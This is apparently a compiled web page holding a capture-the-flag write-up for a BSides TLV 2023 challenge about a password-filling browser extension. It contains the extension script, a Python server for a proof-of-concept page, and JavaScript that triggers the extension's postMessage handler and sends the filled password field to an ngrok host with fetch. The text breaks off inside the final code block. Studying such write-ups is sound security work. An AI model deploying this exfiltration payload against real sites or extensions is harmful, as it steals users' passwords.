import{S as Jo,i as Ko,s as Qo,U as Wa,y as se,z as le,A as ae,V as oe,W as qo,g as ee,d as ne,B as pe,X as jo,k as t,q as e,a as c,Y as L,e as $o,l as F,m as r,r as n,h as l,c as i,Z as H,n as D,T as $a,b as p,D as a,E as te}from"../chunks/index.725d15e1.js";import{P as Fe}from"../chunks/post_layout.16d8f082.js";function re(Y){let d,E,A,g,y,h,b,gl,bl,ys,Tl,kl,Ds,Pl,xl,zs,m,Rl,ds,Ol,Bl,vs,Ml,Ll,Xs,I,N,Hl,Js,S,z,Il,Ks,w,Sl,Es,ql,jl,fs,$l,Wl,Qs,us,Go=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">$ ngrok http 8000</span></div></code></div></pre>`,hs,X,Gl,sl,T,Ga,ll,q,J,Ul,al,v,Vl,Cs,Zl,Yl,ms,Nl,zl,ws,Xl,Jl,_s,Kl,Ql,As,sa,la,ol,gs,Uo=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" javascript="true"><div class="language-id">javascript</div><div class='code-container'><code><div class='line'><span style="color: #546E7A">// Listen for messages from the extension</span></div><div class='line'><span style="color: #EEFFFF">window</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">addEventListener</span><span style="color: #EEFFFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">message</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">function</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">event</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #89DDFF">    </span><span style="color: #546E7A">// Check if the message is from the extension</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #89DDFF">if</span><span style="color: #F07178"> (</span><span style="color: #EEFFFF">event</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">source</span><span style="color: #F07178"> </span><span style="color: #89DDFF">===</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">window</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&&</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">event</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">data</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">action</span><span style="color: #F07178"> </span><span style="color: #89DDFF">===</span><span style="color: #F07178"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">populatePassword</span><span style="color: #89DDFF">"</span><span style="color: #F07178">) </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #89DDFF">        </span><span style="color: #546E7A">// Find the password input field</span></div><div class='line'><span style="color: #F07178">        </span><span style="color: #C792EA">var</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">passwordField</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">document</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">querySelector</span><span style="color: #F07178">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">input[type="password"]</span><span style="color: #89DDFF">'</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'></div><div class='line'><span style="color: #89DDFF">        </span><span style="color: #546E7A">// Populate the password field with the specified string</span></div><div class='line'><span style="color: #F07178">        </span><span style="color: #89DDFF">if</span><span style="color: #F07178"> (</span><span style="color: #EEFFFF">passwordField</span><span style="color: #F07178">) </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">            </span><span style="color: #EEFFFF">passwordField</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">value</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> (</span><span style="color: #EEFFFF">event</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">data</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">url</span><span style="color: #F07178"> </span><span style="color: #89DDFF">===</span><span style="color: #F07178"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">http://flag</span><span style="color: #89DDFF">"</span><span style="color: #F07178">) </span><span style="color: #89DDFF">?</span><span style="color: #F07178"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">BSidevTLV2023&#123;TheFlag&#125;</span><span style="color: #89DDFF">"</span><span style="color: #F07178"> </span><span style="color: #89DDFF">:</span><span style="color: #F07178"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">MyDefaultPassword</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">        </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #89DDFF">&#125;</span><span style="color: #EEFFFF">)</span><span style="color: #89DDFF">;</span></div><div class='line'></div><div class='line'><span style="color: #546E7A">// Send a message to populate the password field on page load</span></div><div class='line'><span style="color: #EEFFFF">window</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">addEventListener</span><span style="color: #EEFFFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">load</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">function</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">()</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #EEFFFF">window</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">postMessage</span><span style="color: #F07178">(</span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">        action</span><span style="color: #89DDFF">:</span><span style="color: #F07178"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">populatePassword</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span></div><div class='line'><span style="color: #F07178">        url</span><span style="color: #89DDFF">:</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">window</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">location</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">href</span><span style="color: #89DDFF">,</span></div><div class='line'><span style="color: #F07178">        password</span><span style="color: #89DDFF">:</span><span style="color: #F07178"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">YourPassword</span><span style="color: #89DDFF">"</span><span style="color: #F07178"> </span><span style="color: #546E7A">// Replace with the desired password</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #89DDFF">&#125;,</span><span style="color: #F07178"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">*</span><span style="color: #89DDFF">"</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #89DDFF">&#125;</span><span style="color: #EEFFFF">)</span><span style="color: #89DDFF">;</span></div></code></div></pre>`,bs,j,K,aa,el,Q,oa,nl,_,$,ea,Ts,na,pa,ta,W,Fa,ks,ra,ca,ia,C,ya,Ps,Da,da,xs,va,Ea,Rs,fa,ua,pl,k,ha,Os,Ca,ma,tl,Bs,Vo=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> http</span><span style="color: #89DDFF">.</span><span style="color: #F07178">server</span></div><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> socketserver</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">PORT </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">8000</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">html_content </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">r</span><span style="color: #89DDFF">'''</span></div><div class='line'><span style="color: #C3E88D">PAYLOAD HERE</span></div><div class='line'><span style="color: #89DDFF">'''</span></div><div class='line'></div><div class='line'><span style="color: #546E7A"># Request Handler</span></div><div class='line'><span style="color: #C792EA">class</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">MyHandler</span><span style="color: #89DDFF">(</span><span style="color: #FFCB6B">http</span><span style="color: #89DDFF">.</span><span style="color: #FFCB6B">server</span><span style="color: #89DDFF">.</span><span style="color: #FFCB6B">BaseHTTPRequestHandler</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">do_GET</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">        self</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">send_response</span><span style="color: #89DDFF">(</span><span style="color: #F78C6C">200</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">        self</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">send_header</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">Content-type</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">text/html</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">        self</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">end_headers</span><span style="color: #89DDFF">()</span></div><div class='line'><span style="color: #EEFFFF">        self</span><span style="color: #89DDFF">.</span><span style="color: #F07178">wfile</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">write</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">html_content</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">encode</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">utf-8</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">))</span></div><div class='line'></div><div class='line'><span style="color: #89DDFF">with</span><span style="color: #EEFFFF"> socketserver</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">TCPServer</span><span style="color: #89DDFF">((</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">0.0.0.0</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> PORT</span><span style="color: #89DDFF">),</span><span style="color: #82AAFF"> MyHandler</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">as</span><span style="color: #EEFFFF"> httpd</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"Serving at port </span><span style="color: #82AAFF">&#123;PORT&#125;</span><span style="color: #C3E88D">"</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    httpd</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">serve_forever</span><span style="color: #89DDFF">()</span></div></code></div></pre>`,Ms,G,ss,wa,Fl,ls,_a,rl,Ls,Zo=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" html="true"><div class="language-id">html</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">&lt;!</span><span style="color: #F07178">DOCTYPE</span><span style="color: #89DDFF"> </span><span style="color: #C792EA">html</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">html</span><span style="color: #89DDFF"> </span><span style="color: #C792EA">lang</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">en</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">head</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">meta</span><span style="color: #89DDFF"> </span><span style="color: #C792EA">charset</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">utf-8</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF"> /&gt;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">meta</span><span style="color: #89DDFF"> </span><span style="color: #C792EA">name</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">viewport</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF"> </span><span style="color: #C792EA">content</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">width=device-width, initial-scale=1</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF"> /&gt;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">title</span><span style="color: #89DDFF">&gt;</span><span style="color: #EEFFFF">POC Vulnerable website</span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">title</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">head</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">body</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">form</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">input</span><span style="color: #89DDFF"> </span><span style="color: #C792EA">type</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">password</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">&gt;&lt;/</span><span style="color: #F07178">input</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #89DDFF">        &lt;</span><span style="color: #F07178">script</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">          window</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">addEventListener</span><span style="color: #EEFFFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">load</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">()</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">=&gt;</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #C792EA">let</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">elem</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">document</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">querySelector</span><span style="color: #F07178">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">input</span><span style="color: #89DDFF">"</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #89DDFF">if</span><span style="color: #F07178">(</span><span style="color: #EEFFFF">elem</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">value</span><span style="color: #F07178"> </span><span style="color: #89DDFF">||</span><span style="color: #F07178"> </span><span style="color: #FF9CAC">true</span><span style="color: #F07178">)</span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">                    </span><span style="color: #82AAFF">fetch</span><span style="color: #F07178">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">https://f5d4-101-50-76-194.ngrok-free.app/?value=</span><span style="color: #89DDFF">"</span><span style="color: #F07178"> </span><span style="color: #89DDFF">+</span><span style="color: #F07178"> (</span><span style="color: #EEFFFF">elem</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">value</span><span style="color: #F07178"> </span><span style="color: #89DDFF">||</span><span style="color: #F07178"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">nothing</span><span style="color: #89DDFF">"</span><span style="color: #F07178">))</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #F07178">            </span><span style="color: #89DDFF">&#125;</span><span style="color: #EEFFFF">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">script</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">form</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">body</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">html</span><span style="color: #89DDFF">&gt;</span></div></code></div></pre>`,Hs,as,Aa,cl,Is,Yo=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">$ python3 poc.py</span></div></code></div></pre>`,Ss,os,ga,il,P,Ua,yl,U,es,ba,Dl,f,Ta,qs,ka,Pa,js,xa,Ra,$s,Oa,Ba,dl,Ws,No=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" javascript="true"><div class="language-id">javascript</div><div class='code-container'><code><div class='line'><span style="color: #82AAFF">setInterval</span><span style="color: #EEFFFF">(</span><span style="color: #89DDFF">()</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">=&gt;</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #C792EA">let</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">elem</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">document</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">querySelector</span><span style="color: #F07178">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">input</span><span style="color: #89DDFF">"</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #89DDFF">if</span><span style="color: #F07178">(</span><span style="color: #EEFFFF">elem</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">value</span><span style="color: #F07178"> </span><span style="color: #89DDFF">||</span><span style="color: #F07178"> </span><span style="color: #FF9CAC">true</span><span style="color: #F07178">)</span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">      </span><span style="color: #82AAFF">fetch</span><span style="color: #F07178">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">https://f5d4-101-50-76-194.ngrok-free.app/?value=</span><span style="color: #89DDFF">"</span><span style="color: #F07178"> </span><span style="color: #89DDFF">+</span><span style="color: #F07178"> (</span><span style="color: #EEFFFF">elem</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">value</span><span style="color: #F07178"> </span><span style="color: #89DDFF">||</span><span style="color: #F07178"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">nothing</span><span style="color: #89DDFF">"</span><span style="color: #F07178">))</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #89DDFF">&#125;</span><span style="color: #89DDFF">else</span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">      </span><span style="color: #EEFFFF">console</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">log</span><span style="color: #F07178">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Hello WORLD</span><span style="color: #89DDFF">"</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #89DDFF">&#125;,</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">20</span><span style="color: #EEFFFF">)</span><span style="color: #89DDFF">;</span></div></code></div></pre>`,Gs,V,ns,Ma,vl,x,La,Us,Ha,Ia,El,Vs,zo=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" javascript="true"><div class="language-id">javascript</div><div class='code-container'><code><div class='line'><span style="color: #82AAFF">setInterval</span><span style="color: #EEFFFF">(</span><span style="color: #89DDFF">()</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">=&gt;</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #EEFFFF">window</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">postMessage</span><span style="color: #F07178">(</span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">      action</span><span style="color: #89DDFF">:</span><span style="color: #F07178"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">populatePassword</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span></div><div class='line'><span style="color: #F07178">      url</span><span style="color: #89DDFF">:</span><span style="color: #F07178"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">http://flag</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span></div><div class='line'><span style="color: #F07178">      password</span><span style="color: #89DDFF">:</span><span style="color: #F07178"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">YourPassword</span><span style="color: #89DDFF">"</span><span style="color: #F07178"> </span><span style="color: #546E7A">// Replace with the desired password</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #89DDFF">&#125;,</span><span style="color: #F07178"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">*</span><span style="color: #89DDFF">"</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'></div><div class='line'><span style="color: #F07178">  </span><span style="color: #C792EA">let</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">elem</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">document</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">querySelector</span><span style="color: #F07178">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">input</span><span style="color: #89DDFF">"</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #89DDFF">if</span><span style="color: #F07178">(</span><span style="color: #EEFFFF">elem</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">value</span><span style="color: #F07178"> </span><span style="color: #89DDFF">||</span><span style="color: #F07178"> </span><span style="color: #FF9CAC">true</span><span style="color: #F07178">)</span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">      </span><span style="color: #82AAFF">fetch</span><span style="color: #F07178">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">https://f5d4-101-50-76-194.ngrok-free.app/?value=</span><span style="color: #89DDFF">"</span><span style="color: #F07178"> </span><span style="color: #89DDFF">+</span><span style="color: #F07178"> (</span><span style="color: #EEFFFF">elem</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">value</span><span style="color: #F07178"> </span><span style="color: #89DDFF">||</span><span style="color: #F07178"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">nothing</span><span style="color: #89DDFF">"</span><span style="color: #F07178">))</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #89DDFF">&#125;</span><span style="color: #89DDFF">else</span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">      </span><span style="color: #EEFFFF">console</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">log</span><span style="color: #F07178">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Hello WORLD</span><span style="color: #89DDFF">"</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #89DDFF">&#125;,</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">20</span><span style="color: #EEFFFF">)</span><span style="color: #89DDFF">;</span></div></code></div></pre>`,Zs,ps,Sa,fl,R,Va,ul,Z,ts,qa,hl,Fs,ja,Cl,Ys,Xo=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> http</span><span style="color: #89DDFF">.</span><span style="color: #F07178">server</span></div><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> socketserver</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">PORT </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">8000</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">html_content </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">r</span><span style="color: #89DDFF">"""</span></div><div class='line'><span style="color: #C3E88D">&lt;!DOCTYPE html&gt;</span></div><div class='line'><span style="color: #C3E88D">&lt;html lang="en"&gt;</span></div><div class='line'><span style="color: #C3E88D">&lt;head&gt;</span></div><div class='line'><span style="color: #C3E88D">    &lt;meta charset="utf-8" /&gt;</span></div><div class='line'><span style="color: #C3E88D">    &lt;meta name="viewport" content="width=device-width, initial-scale=1" /&gt;</span></div><div class='line'><span style="color: #C3E88D">    &lt;title&gt;POC Vulnerable website&lt;/title&gt;</span></div><div class='line'><span style="color: #C3E88D">&lt;/head&gt;</span></div><div class='line'><span style="color: #C3E88D">&lt;body&gt;</span></div><div class='line'><span style="color: #C3E88D">    &lt;form&gt;</span></div><div class='line'><span style="color: #C3E88D">        &lt;input type="password"&gt;&lt;/input&gt;</span></div><div class='line'><span style="color: #C3E88D">    &lt;/form&gt;</span></div><div class='line'><span style="color: #C3E88D">    &lt;script&gt;</span></div><div class='line'><span style="color: #C3E88D">            setInterval</span><span style="color: #89DDFF">(()</span><span style="color: #C3E88D"> =&gt; &#123;</span></div><div class='line'><span style="color: #C3E88D">                window.postMessage</span><span style="color: #89DDFF">(</span><span style="color: #C3E88D">&#123;</span></div><div class='line'><span style="color: #C3E88D">                    action: "populatePassword",</span></div><div class='line'><span style="color: #C3E88D">                    url: "http://flag",</span></div><div class='line'><span style="color: #C3E88D">                    password: "YourPassword" // Replace with the desired password</span></div><div class='line'><span style="color: #C3E88D">                &#125;, "</span><span style="color: #89DDFF">*</span><span style="color: #C3E88D">"</span><span style="color: #89DDFF">)</span><span style="color: #C3E88D">;</span></div><div class='line'></div><div class='line'><span style="color: #C3E88D">                let elem = document.querySelector</span><span style="color: #89DDFF">(</span><span style="color: #C3E88D">"input"</span><span style="color: #89DDFF">)</span><span style="color: #C3E88D">;</span></div><div class='line'><span style="color: #C3E88D">                if</span><span style="color: #89DDFF">(</span><span style="color: #C3E88D">elem.value </span><span style="color: #89DDFF">||</span><span style="color: #C3E88D"> true</span><span style="color: #89DDFF">)</span><span style="color: #C3E88D">&#123;</span></div><div class='line'><span style="color: #C3E88D">                    fetch</span><span style="color: #89DDFF">(</span><span style="color: #C3E88D">"https://f5d4-101-50-76-194.ngrok-free.app/</span><span style="color: #89DDFF">?</span><span style="color: #C3E88D">value=" </span><span style="color: #89DDFF">+</span><span style="color: #C3E88D"> </span><span style="color: #89DDFF">(</span><span style="color: #C3E88D">elem.value </span><span style="color: #89DDFF">||</span><span style="color: #C3E88D"> "nothing"</span><span style="color: #89DDFF">))</span><span style="color: #C3E88D">;</span></div><div class='line'><span style="color: #C3E88D">                &#125;else&#123;</span></div><div class='line'><span style="color: #C3E88D">                    console.log</span><span style="color: #89DDFF">(</span><span style="color: #C3E88D">"Hello WORLD"</span><span style="color: #89DDFF">)</span><span style="color: #C3E88D">;</span></div><div class='line'><span style="color: #C3E88D">                &#125;</span></div><div class='line'><span style="color: #C3E88D">            &#125;, 20</span><span style="color: #89DDFF">)</span><span style="color: #C3E88D">;</span></div><div class='line'><span style="color: #C3E88D">    &lt;/script&gt;</span></div><div class='line'><span style="color: #C3E88D">&lt;/body&gt;</span></div><div class='line'><span style="color: #C3E88D">&lt;/html&gt;</span></div><div class='line'><span style="color: #89DDFF">"""</span></div><div class='line'></div><div class='line'><span style="color: #C792EA">class</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">MyHandler</span><span style="color: #89DDFF">(</span><span style="color: #FFCB6B">http</span><span style="color: #89DDFF">.</span><span style="color: #FFCB6B">server</span><span style="color: #89DDFF">.</span><span style="color: #FFCB6B">BaseHTTPRequestHandler</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">do_GET</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">        self</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">send_response</span><span style="color: #89DDFF">(</span><span style="color: #F78C6C">200</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">        self</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">send_header</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">Content-type</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">text/html</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">        self</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">end_headers</span><span style="color: 